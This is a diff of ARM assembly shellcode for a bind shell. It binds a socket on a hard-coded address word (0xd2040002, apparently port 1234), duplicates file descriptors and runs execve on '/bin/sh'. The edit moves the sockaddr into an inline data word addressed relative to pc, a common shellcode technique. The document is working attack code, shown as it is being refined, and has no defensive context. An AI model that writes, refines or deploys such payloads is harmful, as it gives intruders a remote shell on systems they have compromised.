@@ -6,8 +6,6 @@
     .text
 
 _start:
-    // load sockaddr_in and /bin/sh
-    bic    r4, ~0xd2040002
     // switch to thumb mode
 	  .code 32
     add    r3, pc, #1
@@ -26,7 +24,7 @@ _start:
     
     // bind(s, &sa, sizeof(sa));  
     mov    r2, #16      // r2 = sizeof(sa)
-    mov    r1, sp       // r1 = &sa     
+    add    r1, pc, #sa - $       // r1 = &sa     
     add    r7, #1       // r7 = 281+1 = 282 = bind
     svc    1
   
@@ -65,7 +63,10 @@ dup_loop:
     mov    r7, #11       // r7 = execve
     svc    1
     nop
-    nop  
+    nop
+sa:    
+.word  0xd2040002
+sh:    
 .ascii "/bin/sh"
 
 
